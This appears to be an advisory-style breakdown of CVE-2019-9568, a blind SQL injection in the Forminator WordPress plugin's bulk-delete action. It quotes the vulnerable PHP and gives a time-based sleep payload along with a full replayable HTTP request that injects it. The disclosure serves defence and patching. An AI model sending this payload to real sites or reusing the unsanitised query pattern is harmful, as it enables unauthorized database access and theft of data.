The content relates to CVE-2019-9568.

Here's a breakdown of the vulnerability information:

**Vulnerability:** Authenticated Blind SQL Injection

*   **Affected Software:** Forminator WordPress Plugin
*   **Affected Version:** 1.5.4
*   **Patched Version:** 1.6
*   **CVE:** CVE-2019-9568
*   **Risk:** High

*   **Root Cause:** The action of deleting submissions is vulnerable to blind SQL injection.
*   **Attack Vector:**
    *   The attacker needs an account with permission to delete submissions.
    *   The attacker views submissions (e.g., `http://192.168.0.103/wordpress/wp-admin/admin.php?page=forminator-entries&form_type=forminator_forms&form_id=133`).
    *   The attacker checks the checkbox of one submission and uses the bulk action to delete entries.
    *   The attacker intercepts or replays the request and changes the `entry[]` value to contain an SQL payload (e.g., `1) or sleep(5)--x-`).
*   **Impact:** An attacker can exploit this to extract data from the database.
*   **Vulnerable Code:**
    ```php
    forminator/library/model/class-form-entry-model.php
    $sql = "DELETE FROM {$table_meta_name} WHERE `entry_id` IN ($entries)";
    $db->query( $sql );

    $sql = "DELETE FROM {$table_name} WHERE `entry_id` IN ($entries)";
    ```
    The vulnerability lies in the fact that the `$entries` variable is not properly sanitized before being used in the SQL query.

    *   **Request example:**

```
GET /wordpress/wp-admin/admin.php?page=forminator-entries&form_type=forminator_forms&form_id=133&forminatorEntryNonce=1c8732f95e&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fadmin.php%3Fpage%3Dforminator-entries%26form_type%3Dforminator_forms%26form_id%3D133&entries-action=&date_range=&min_id=&max_id=&search=&order_by=entries.date_created&order=DESC&entry%5B%5D=1)+or+sleep(5)--+-&entry%5B%5D=1&entries-action-bottom=delete-all HTTP/1.1
